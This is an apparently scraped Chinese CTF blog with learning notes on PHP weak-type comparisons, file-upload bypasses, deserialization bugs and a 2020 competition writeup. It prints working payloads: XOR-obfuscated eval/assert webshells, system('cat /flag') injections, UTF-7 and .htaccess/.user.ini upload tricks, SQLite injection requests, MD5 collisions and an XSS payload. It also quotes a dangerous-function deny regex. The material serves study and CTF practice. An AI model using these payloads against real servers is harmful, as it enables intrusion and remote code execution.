isset($_GET['b'])) &#123; if ($_GET['a'] != $_GET['b']) &#123; if (md5($_GET['a']) === md5($_GET['b'])) echo 'flag'; else echo 'Wrong'; &#125; &#125; ?> 要得到flag，得想办法让a和b的值不相等，但md5加密后的值相等。 由于md5或者sha不能加密数组，所以在加密数组的时候会返回false。 利用这点，给a和b分别传参两个不同的数组，就可以得到flag。 ?a[]&#x3D;1&amp;b[]&#x3D;2 十六进制比较问题&lt;?php function fun($number) &#123; $one = ord('1'); $nine = ord('9'); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit >= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == '54975581388'; &#125; if( fun($_GET['a']) ) echo 'flag'; else echo 'Wrong'; ?> ord() 函数返回字符串的首个字符的 ASCII 值。 这道题的意思就是要求输入一个key，然后这个key必须等于54975581388，但是在自定义的函数里面又不允许出现数字1到9，正好54975581388=0xccccccccc这样就绕过了检测。 “0x”开头跟数字的字符串（例如”0x1e240”）会被当作16进制数去比较。 &lt;?php var_dump(0x1e240 == 123456); var_dump(54975581388 == 0xccccccccc); ?> bool(true)bool(true) ?a&#x3D;0xccccccccc hash值和字符串“0”比较在比较的时候，当出现xex模式，将会当做科学计数法进行比较。 而只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，即0e\\d+的字符串 == ‘0’ 为true。 &lt;?php $str1 = \"a\"; echo md5($str1); var_dump(md5($str1) == '0'); $str2 = \"s224534898e\"; echo md5($str2); var_dump(md5($str2) == '0'); $str3 = 'a1b2edaced'; echo md5($str3); var_dump(md5($str3) == '0'); ?> 0cc175b9c0f1b6a831c399e269772661bool(false)0e420233178946742799316739797882bool(true)0e45ea817f33691a3dd1f46af81166c4bool(false) PHP 组合比较运算符组合比较运算符，符号为：&lt;=&gt; $c = $a &lt;=> $b; 相当于 $c = $a > $b ? 1 : ( $a==$b ? 0 : -1 ); 当 $a &gt; $b 时，$c = 1 当 $a == $b 时，$c = 0 当 $a &lt; $b 时，$c = -1 &lt;?php $a = 1; $b = 2; $c = $a &lt;=> $b; echo $c; ?> -1 组合比较运算符同样存在 == 弱类型比较问题，原理同 “==”与“===” &lt;?php $a = '0e12'; $b = '0e34'; $c = $a &lt;=> $b; echo $c; ?> 0 PHP strcmp() 函数int strcmp ( string $str1 , string $str2 ) 根据ACSII表进行比较，从左到右依次进行，出现不同就停止比较，返回结果。 如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 &lt;?php // 二进制安全比较字符串（区分大小写） echo strcmp('Hello', 'hello'); ?> -1 因为’H’的ASCII值比’h’的小，所以返回负数 &lt;?php $password=\"***\"; if(isset($_GET['password']))&#123; if (strcmp($_GET['password'], $password) == 0) echo \"flag\"; else echo \"Wrong\"; &#125; ?> PHP5.3以上版本的strcmp()存在漏洞，只要$_GET[‘password’]是一个数组或者一个object即可绕过。 ?password[]&#x3D;a 题目weak_type1&lt;?php highlight_file(__FILE__); $o = $_GET['o']; if(is_numeric($o))&#123; die(\"no hack!!\"); &#125; if($o==520)&#123; echo file_get_contents('/flag'); &#125; ?> &#x2F;?o&#x3D;520a weak_type3&lt;?php highlight_file(__FILE__); function noother_says_correct($number) &#123; $one = ord('1'); $nine = ord('9'); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit >= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == '54975581388'; &#125; $flag=file_get_contents(\"/flag\"); if(noother_says_correct($_GET['key'])) echo $flag; else echo 'access denied'; ?> &#x2F;?key&#x3D;0xccccccccc weak_type4&lt;?php highlight_file(__FILE__); if (isset($_POST['a']) and isset($_POST['b'])) &#123; if ($_POST['a'] != $_POST['b']) if (md5($_POST['a']) === md5($_POST['b'])) echo file_get_contents(\"/flag\"); else print 'Wrong.'; &#125; ?> a[]&#x3D;1&amp;b[]&#x3D;2 weak_type5&lt;?php if (isset($_GET['username']) &amp;&amp; isset($_GET['password'])) &#123; $logined = true; $username = $_GET['username']; $password = $_GET['password']; if (!ctype_alpha($username)) &#123;$logined = false;&#125; if (!is_numeric($password) ) &#123;$logined = false;&#125; if (md5($username) != md5($password)) &#123;$logined = false;&#125; if ($logined)&#123; echo \"flag\"; &#125; else&#123; echo \"login failed!\"; &#125; &#125; ?> isset() 检测变量是否设置 ctype_alpha函数功能就是检测是否是字符 is_numeric 检测变量是否为数字或数字字符串 username必须是字母，password必须是数字，再将传入的username和password进行md5加密后进行比较且结果要相等。 如果md5加密后的值是0e开头，这样就存在弱类型比较问题就可以通过，所以要想得到flag，得寻找纯字母和纯数字md5加密后是0e开头的值。 &lt;?php var_dump(md5('QNKCDZO') == md5('240610708')); ?> bool(true) ?username&#x3D;QNKCDZO&amp;password&#x3D;240610708 weak_type6&lt;?php highlight_file(__FILE__); $cmd=$_GET['cmd']; if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) &#123; echo `$cmd`; &#125; else &#123; echo (\"md5 is funny ~\"); &#125; ?> 尝试使用weak_type4的a[]=1&amp;b[]=2，发现不行，测试后发现数组被强制装换为字符串后都是Array &lt;?php $a = $_POST['a']; $b = $_POST['b']; echo \"a=\".(string)$a.\"&lt;br>\"; echo \"b=\".(string)$b; ?> a=Array b=Array 参考MD5碰撞后，用burp suite抓包 a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 天融信面试题&lt;html&gt; &lt;body&gt; &lt;form action&#x3D;&quot;index.php&quot; class&#x3D;&quot;authform&quot; method&#x3D;&quot;post&quot; accept-charset&#x3D;&quot;utf-8&quot;&gt; &lt;fieldset&gt; &lt;legend&gt;Unbreakable Random&lt;&#x2F;legend&gt; &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;s&quot; name&#x3D;&quot;s&quot; value&#x3D;&quot;&quot; placeholder&#x3D;&quot;seed&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;h&quot; name&#x3D;&quot;h&quot; value&#x3D;&quot;&quot; placeholder&#x3D;&quot;hash&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Check&quot; &#x2F;&gt; &lt;div class&#x3D;&quot;return-value&quot; style&#x3D;&quot;padding: 10px 0&quot;&gt;&amp;nbsp;&lt;&#x2F;div&gt; &lt;&#x2F;fieldset&gt; &lt;&#x2F;form&gt; &lt;?php function gen_secured_random() &#123; &#x2F;&#x2F; cause random is the way $a &#x3D; rand(1337,2600)*42; $b &#x3D; rand(1879,1955)*42; $a &lt; $b ? $a ^&#x3D; $b ^&#x3D; $a ^&#x3D; $b : $a &#x3D; $b; return $a+$b; &#125; function secured_hash_function($plain) &#123; &#x2F;&#x2F; cause md5 is the best hash ever $secured_plain &#x3D; sanitize_user_input($plain); return md5($secured_plain); &#125; function sanitize_user_input($input) &#123; &#x2F;&#x2F; cause someone told me to never trust user input $re &#x3D; &#39;&#x2F;[^a-zA-Z0-9]&#x2F;&#39;; $secured_input &#x3D; preg_replace($re, &quot;&quot;, $input); return $secured_input; &#125; if (isset($_GET[&#39;source&#39;])) &#123; show_source(__FILE__); die(); &#125; require_once &quot;secret.php&quot;; if (isset($_POST[&#39;s&#39;]) &amp;&amp; isset($_POST[&#39;h&#39;])) &#123; $s &#x3D; sanitize_user_input($_POST[&#39;s&#39;]); $h &#x3D; secured_hash_function($_POST[&#39;h&#39;]); $r &#x3D; gen_secured_random(); if($s !&#x3D; false &amp;&amp; $h !&#x3D; false) &#123; if($s.$r &#x3D;&#x3D; $h) &#123; print &quot;Well done! Here is your flag: &quot;.$flag; &#125; else &#123; print &quot;Fail...&quot;; &#125; &#125; else &#123; print &quot;&lt;p&gt;Hum ...&lt;&#x2F;p&gt;&quot;; &#125; &#125; ?&gt; &lt;p&gt;&lt;em&gt;&lt;a href&#x3D;&quot;index.php?source&quot;&gt;source code&lt;&#x2F;a&gt;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; 其中几个函数的作用 gen_secured_random() 虽然不知道$a ^= $b ^= $a ^= $b的结果会是怎么样的，但$a+$b的值的长度都是六位数 &lt;?php for($i = 1; $i &lt; 100; $i++)&#123; $a = rand(1337,2600)*42; $b = rand(1879,1955)*42; $a &lt; $b ? $a ^= $b ^= $a ^= $b : $a = $b; if(strlen($a+$b) != 6)&#123; echo \"不是6位数\"; break; &#125; &#125; echo \"i = \".$i; ?> i = 100 sanitize_user_input($input) 对传进来的$input进行过滤，将不是26个字母和数字的字符替换为空 secured_hash_function($plain) 调用sanitize_user_input()函数，对传进来的$plain进行过滤，返回过滤后的md5值 $s = sanitize_user_input($_POST['s']); $h = secured_hash_function($_POST['h']); $r = gen_secured_random(); if($s != false &amp;&amp; $h != false) &#123; if($s.$r == $h) &#123; print \"Well done! Here is your flag: \".$flag; &#125; &#125; 对传进来的$s，过滤掉其它字符，剩下字母和数字 $h也过滤掉后进行md5加密 $r为一个6位数的数 如果$s和$h都不等于false 以及 $s拼接上$r后如果和$h相等的话，就可以得到flag 这里的==存在弱类型比较问题 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 &lt;?php var_dump(\"0e123456789\" == \"0\"); //bool(true) var_dump(\"0e123456789\" === \"0\"); //bool(false) ?> 已知用md5加密s878926199a后的结果是以0e开头的 &lt;?php echo md5(\"s878926199a\"); //0e545993274517709034328855841020 ?> 所以$h=s878926199a，md5加密后为32位，减去$r的6位后，也就是说$s是以0e开头的26位数 可以是$s=0e111111111111111111111111 即s=0e111111111111111111111111&amp;h=s878926199a 当然可以是这样的 s=0e&amp;h=s878926199a","categories":[{"name":"CTF","slug":"CTF","permalink":"https://flag2020.top/categories/CTF/"}],"tags":[{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"}]},{"title":"2020全国工业互联网安全技术技能大赛 writeup","slug":"2020全国工业互联网安全技术技能大赛 writeup","date":"2020-10-23T16:00:00.000Z","updated":"2021-04-09T14:00:16.147Z","comments":true,"path":"posts/20201024.html","link":"20201024","permalink":"https://flag2020.top/posts/20201024.html","excerpt":"签个到","text":"签个到 签到拼图，拼完就可以得到flag flag flag&#123;welcome_to_chinaiisc2020&#125; SimpleCalculator不知道怎么用这个计算器来计算，查看网页源码，尝试用 ?search 传参 尝试使用异或绕过 &lt;?php $a = urldecode('%ff%ff%ff%ff'); $b = urldecode('%a0%b8%ba%ab'); echo $a^$b; //输出_GET 构造phpinfo() $&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo //$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo 构造webshell $&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%ff]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%a0]);&amp;%ff=assert&amp;%a0=eval($_POST[%27cmd%27]) //$&#123;_GET&#125;[assert]($&#123;_GET&#125;[eval($_POST[%27cmd%27])]); 使用蚁剑查看 http://eci-2ze7n0wiyptutv9upaxm.cloudeci1.ichunqiu.com/flag.php?search=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%ff]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%a0]);&amp;%ff=assert&amp;%a0=eval($_POST[%27cmd%27]) 在网站根目录下找到flag flag flag&#123;08768680-a69a-42f1-b515-4220cf7e9a0d&#125; 其它方法： ?search=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;($&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%a0&#125;);&amp;%ff=system&amp;%a0=cat%20/flag //?search=$&#123;_GET&#125;&#123;system&#125;($&#123;_GET&#125;&#123;cat /flag&#125;); SQLManager参考文章：https://www.anquanke.com/post/id/200927#h3-6 题目说这是个简易的SQLite管理器。 而SQLite管理器有一个自动创建的库sqlite_master，里面保存了所有表名以及创建表时的create语句。在创建表时可以用as来复制另一个表中的数据，所以我们可以从中获取到flag的表名和字段名。 在建表界面用burp suite抓包，重放包得到flag的表名和字段名 table_name=a as select sql as[&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=INTEGER 这里可以得知flag所在的表：flag_Y0U_c4nt_GUESS，以及所在的字段：flag_ThE_C0lumn 删表后再次抓包，表名为 b ，继续用burp suite重放包 将a改为b，sql改为flag_Y0U_c4nt_GUESS，将sqlite_master改为flag_ThE_C0lumn table_name=b as select [flag_ThE_C0lumn] as[&amp;columns[0][name]=]from flag_Y0U_c4nt_GUESS;&amp;columns[0][type]=INTEGER flag flag&#123;486756b1-d23c-4236-b44c-cd43640098c6&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://flag2020.top/categories/CTF/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://flag2020.top/tags/writeup/"}]},{"title":"文件上传漏洞","slug":"文件上传漏洞","date":"2020-10-16T16:00:00.000Z","updated":"2021-04-09T15:03:40.461Z","comments":true,"path":"posts/20201017.html","link":"20201017","permalink":"https://flag2020.top/posts/20201017.html","excerpt":"php文件上传漏洞学习笔记","text":"php文件上传漏洞学习笔记 文件上传漏洞一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。 通常造成文件上传漏洞的原因是：对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。 文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。 这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。 .htaccess任意文件解析 .htaccess可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、封禁特定IP地址的用户，只允许特定IP地址的用户，以及使用其他文件作为index文件配置默认文档等功能。 当服务器是上传使用的是黑名单机制，但是锁死了不给上传php后缀的文件，我们可以使用.htaccess文件重新配置当前文件的解析后缀为其他后缀绕过导致其他后缀的文件被解析为php。导致远程代码执行。 AddType application&#x2F;x-httpd-php .aaa .htaccess文件配置信息,这里将后缀为.aaa的文件均解析为php文件 短标签绕过假设&lt;?php 被被过滤，同时PHP版本为5可以使用段标签绕过。 JS风格 &lt;script language=\"php\">phpinfo();&lt;/script> 短标签风格 &lt;?=phpinfo();?> &lt;?=?&gt;与&lt;?php echo ....?&gt;等效 ASP风格 &lt;% phpinfo();%> 官方默认风格 &lt;?php phpinfo(); ?> 特殊编码绕过(UTF-7)如果程序过滤了所有标签形式、或者说过滤了&lt;?而且PHP是在PHP7以上版本（PHP7已经将其他标签形式过淘汰，仅剩下&lt;?php形式），这时候可以使用.htaccess解码对应的文件，例如可以使用UTF-7进行解码：(https://www.novel.tools/encode/UTF-7这个网站可以编码和解码UTF-7） .htaccess AddType application&#x2F;x-httpd-php .aaa php_flag display_errors on php_flag zend.multibyte 1 php_value zend.script_encoding &quot;UTF-7&quot; 1.aaa +ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4- 双写绕过假如对上传文件的内容中的php，POST，eval替换为空，那么我们可以用这样的方式绕过。 &lt;?pphphp @eevalval($_PPOSTOST['cmd']); &lt;?php @eval($_POST['cmd']); .user.ini绕过假如.htaccess被过滤了，不允许上传，而上传目录下有一个php文件，则可以使用.user.ini将我们制定文件包含到我们目录下的所有PHP文件导致远程代码执行。 1.aaa &lt;?php @eval($_POST['cmd']); .user.ini auto_prepend_file&#x3D;1.aaa 加载其它php文件的时候，会先加载.user.ini里的1.aaa .htaccess文件换行绕过上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。 .htaccess支持换行编写所以使用换行可以直接上传成功并解析。 AddType appli\\ cation&#x2F;x-httpd-php .aaa 过滤掉application，则使用换行绕过 文件包含解码Base64 .htaccess AddType application&#x2F;x-httpd-php .aaa php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.aaa&quot; 动态拼接函数绕过函数过滤对危险函数进行了过滤，不允许上传，则可以使用aiisc码拼接动态构造函数来绕过。 使用脚本快速生成指定函数 &lt;?php $a = \"phpinfo\"; for($i=0;$i&lt;strlen($a);$i++)&#123; echo \"chr(\".ord($a[$i]).\").\"; &#125; ?> chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111) 1.aaa &lt;?php $a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111); $a(); ?&gt; 图片头绕过上传1.aaa，被检测到文件不是图片类型，则可以通过以下方法绕过，则有可能被识别为图片，绕过检测。 XMB文件头绕过#define test_width 16 #define test_height 7 1.aaa #define test_width 16 #define test_height 7 &lt;?php $a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111); $a(); ?&gt; GIF89aGIF89a 1.aaa GIF89a &lt;?php $a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111); $a(); ?&gt; 题目upload2发现不能上传php文件，且文件内容不能使用官方默认风格(上传提示：Can’t upload php file)，所以尝试使用其它标签绕过 .htaccess AddType application&#x2F;x-httpd-php .aaa 1.aaa &lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt; 在根目录下找到flag。 或者 cat /flag upload3 .htaccess AddType application&#x2F;x-httpd-php .aaa 1.aaa &lt;?php @eval($_POST[&#39;cmd&#39;]); 发现php，eval，POST被替换为空，使用双写绕过。 .htaccess AddType application&#x2F;x-httpd-pphphp .aaa 1.aaa &lt;?pphphp @eevalval($_PPOSTOST[&#39;cmd&#39;]); upload4 .htaccess AddType application&#x2F;x-httpd-php .aaa 1.aaa &lt;?php @eval($_POST[&#39;cmd&#39;]); 发现没有上传。上传test.php和1.jpg（不是真的jpg文件）也都失败，尝试使用.user.ini绕过，结果提示：内容不能有file。 几次尝试后发现，它对文件内容进行检查，不能含有&lt;?，且无法用其它标签绕过。 尝试使用特殊编码绕过，上传.htaccess和1.aaa .htaccess AddType application&#x2F;x-httpd-php .aaa php_flag display_errors on php_flag zend.multibyte 1 php_value zend.script_encoding &quot;UTF-7&quot; 1.aaa +ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4- 在根目录下找到flag。 找到flag之后查看php版本为：7.0.33 尝试发现： 由于版本为7.0以上且过滤掉&lt;?，所以无法使用其它标签绕过。 upload6 .htaccess AddType application&#x2F;x-httpd-php .aaa 提示：内容不能有application 尝试使用.htaccess文件换行绕过。 .htaccess AddType appli\\ cation&#x2F;x-httpd-php .aaa 1.aaa &lt;?php @eval($_POST[&#39;cmd&#39;]); upload7 .htaccess AddType application&#x2F;x-httpd-php .aaa 1.aaa &lt;?php @eval($_POST[&#39;cmd&#39;]); 上传1.aaa 提示：不能含有危险函数！ 使用burp suite抓包看看，发现eval和POST被过滤了。 尝试使用动态拼接函数绕过函数过滤，发现可以成功上传，然后访问该文件就可以得到flag。 1.aaa &lt;?php $a &#x3D; chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $a(&#39;cat &#x2F;flag&#39;); &lt;?php $a = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); echo $a; 输出：system PS： ctf-wscan下载地址：https://codeload.github.com/kingkaki/ctf-wscan/zip/master 做题前可以先扫扫看有没有备份文件 像robots.txt 、www.zip。 使用扫描器扫描发现存在备份文件 下载备份文件 把.index.php.swp放到linux下使用vim -r恢复 vim -r index.php.swp 得到源代码 &lt;?php //设置上传目录 define(\"UPLOAD_PATH\", \"../upload\"); function deldot($s)&#123; for($i=strlen($s)-1;$i>0;$i--)&#123; $c=substr($s,$i,1); if($i == strlen($s)-1 and $c != '.')&#123; return $s; &#125; if($c != '.')&#123; return substr($s,0,$i+1); &#125; &#125; &#125; $is_upload=false; $msg=null; if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext=array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name=trim($_FILES['pic']['name']); $file_name=deldot($file_name);//删除文件名末尾的点 $file_ext=strrchr($file_name, '.'); $file_ext=strtolower($file_ext); //转换为小写 $file_ext=str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext=trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file=$_FILES['pic']['tmp_name']; $img_path=UPLOAD_PATH.'/'.$file_name; if(preg_match(\"/(phpinfo|system\\(|eval\\(|file_put_contents|file_get_contents|passthru|exec\\(|chroot|scandir|proc_open|delfolder|unlink|mkdir|fopen|fread|fwrite|fputs|tmpfile|flock|chmod|delete|assert|_post|_get|_request|_file|create_function|array_walk|preg_replace|cookie)/Ui\",file_get_contents($temp_file)))&#123; die(\"不能含有危险函数！\"); &#125; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload=true; echo \"上传成功\".\"&lt;br>\"; echo $img_path; &#125;else&#123; echo '上传出错！'; &#125; &#125;else&#123; echo '此文件不允许上传!'; &#125; &#125;else&#123; echo UPLOAD_PATH . '文件夹不存在,请重新上传！'; mkdir(UPLOAD_PATH,775,true); &#125; &#125; ?>","categories":[{"name":"CTF","slug":"CTF","permalink":"https://flag2020.top/categories/CTF/"}],"tags":[{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"}]},{"title":"反序列化漏洞","slug":"反序列化漏洞","date":"2020-10-07T16:00:00.000Z","updated":"2021-04-09T15:00:50.711Z","comments":true,"path":"posts/20201008.html","link":"20201008","permalink":"https://flag2020.top/posts/20201008.html","excerpt":"php反序列化漏洞学习笔记","text":"php反序列化漏洞学习笔记 反序列化漏洞所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 序列化 serialize() 将对象转变成一个字符串便于之后的传递与使用。 序列化会保存对象所有的变量，但是不会保存对象的方法。 反序列化 unserialize() 将序列化的结果恢复成对象。 反序列化一个对象，这个对象的类必须在反序列化之前定义，或者通过包含该类的定义或者使用 spl_autoload_register() (自动包含类)实现 序列化和反序列化本身没有问题，但是如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。 php魔术方法 PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。 通常来说有一些PHP的魔法函数会导致反序列化漏洞，如： __construct 当一个对象创建时自动调用 __wakeup 使用unserialize()函数时会自动调用 __destruct 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象) __toString 当一个对象被当作一个字符串被调用。 __sleep() 使用serialize()函数时触发 __call() 在对象上下文中调用不可访问的方法时触发 __callStatic() 在静态上下文中调用不可访问的方法时触发 __get() 用于从不可访问的属性读取数据 __set() 用于将数据写入不可访问的属性 __isset() 在不可访问的属性上调用isset()或empty()触发 __unset() 在不可访问的属性上使用unset()时触发 __toString() 把类当作字符串使用时触发,返回值需要为字符串 __invoke() 当脚本尝试将对象调用为函数时触发 &lt;?php class test &#123; public $varr1 = \"abc\"; public $varr2 = \"123\"; public function echoP() &#123; echo $this->varr1.\"&lt;br>\"; &#125; public function __construct() &#123; echo \"__construct&lt;br>\"; &#125; public function __destruct() &#123; echo \"__destruct&lt;br>\"; &#125; public function __toString() &#123; return \"__toString&lt;br>\"; &#125; public function __sleep() &#123; echo \"__sleep&lt;br>\"; return array('varr1','varr2'); &#125; public function __wakeup() &#123; echo\"__wakeup&lt;br>\"; &#125; &#125; $obj = new test();//序列化对象，调用__construct()方法，输出__construct $obj->echoP(); //调用echoP()方法，输出\"abc\" echo $obj; //obj对象被当做字符串输出，调用__toString()方法，输出__toString $s = serialize($obj); //obj对象被序列化，调用__sleep()方法，输出__sleep echo unserialize($s); //$s首先会被反序列化，会调用__wakeup()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。 //脚本结束销毁对象（$obj和反序列化的$s）时，又会调用__destruct()方法（两次），输出__destruct（两次） ?> 反序列化漏洞例子： &lt;?php class A&#123; var $test = \"kawhi\"; function __wakeup()&#123; echo $this->test; &#125; &#125; $a = $_GET['a']; $b = unserialize($a); ?> 尝试构造序列化代码的时候插入xss &lt;?php class A&#123; var $test = \"&lt;img src=1 onerror=alert(1)>\"; function __wakeup()&#123; echo $this->test; &#125; &#125; $c = new A(); $c = serialize($c); echo $c; ?> 输出O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:28:&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;;&#125; O表示类型是object 1表示object对应的类的名字的长度为1 “A”表示类名 1表示对应变量的个数 s表示序列化后为字符串 4表示字符串的长度 “test&quot;表示表示变量名 s表示变量test的类型 28表示变量test的长度 &quot;&lt;img src=1 onerror=alert(1)&gt;&quot;表示变量test的值 如果__wakeup中不是echo()，而是eval()，那么就是任意代码执行，危害就更大了。 wakeup绕过一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数 例：在网站根目录下有两个文件flag.php和test.php test.php源码如下： &lt;?php class A&#123; public $file = __FILE__; function __construct($file)&#123; $this->file = $file; &#125; function __wakeup()&#123; if($this->file !== __FILE__)&#123; $this->file = __FILE__; &#125; &#125; function __destruct()&#123; highlight_file($this->file); &#125; &#125; if(isset($_REQUEST['file']))&#123; @unserialize($_REQUEST['file']); &#125; else&#123; highlight_file(__FILE__); &#125; ?> 构造序列化代码 &lt;?php class A&#123; function __construct()&#123; $this->file = \"flag.php\"; &#125; &#125; $a = new A; $b = serialize($a); print_r($b); ?> 输出： O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 如果直接进行正常的反序列化的话，即 http://127.0.0.1/test.php/?file=O:1:&quot;A&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 页面没有其它变化，因为在使用unserialize()的时候自动调用__wakeup，将file替换为当前路径 php在解析属性长度的时候，若是出错 将O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;改为 O:1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 它并不会终止，而是继续执行，但不会调用__wakeup() 然后在销毁对象的时候自动调用__destruct()函数，高亮显示flag.php exp http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; OC绕过对test.php进行修改 对传进来的file进行过滤 &lt;?php class A&#123; public $file = __FILE__; function __construct($file)&#123; $this->file = $file; &#125; function __wakeup()&#123; if($this->file !== __FILE__)&#123; $this->file = __FILE__; &#125; &#125; function __destruct()&#123; highlight_file($this->file); &#125; &#125; if(isset($_REQUEST['file']))&#123; $file = $_REQUEST['file']; if(preg_match('/[OC]:\\d+:/i', $file))&#123; die(\"hacking!!!\"); &#125; @unserialize($_REQUEST['file']); &#125; else&#123; highlight_file(__FILE__); &#125; ?> 正则表达式中对file进行了过滤 当遇到 字母O或C 加上:，再加上一段数字和:，后面的 i 表示不区分大小写 时，则die掉。 该正则表达式匹配的部分为：O:1: 若在中间插入一些字符，就可以让它匹配不完全，这样就可以绕过正则匹配 对于数字 1 来说，+1 和 1 时一样的，这样就可以绕过 但在URL传参中，会进行解码，会把加号（+）变成空格，所以应用+的URL编码：%2b代替 即： O:%2b1: exp http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:%2b1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 私有属性绕过php中的访问类型（public，private，protected） public 公有修饰符，类中的成员没有访问限制，所有外部成员都可以访问（读和写）这个类成员（包括成员属性和成员方法）。 private 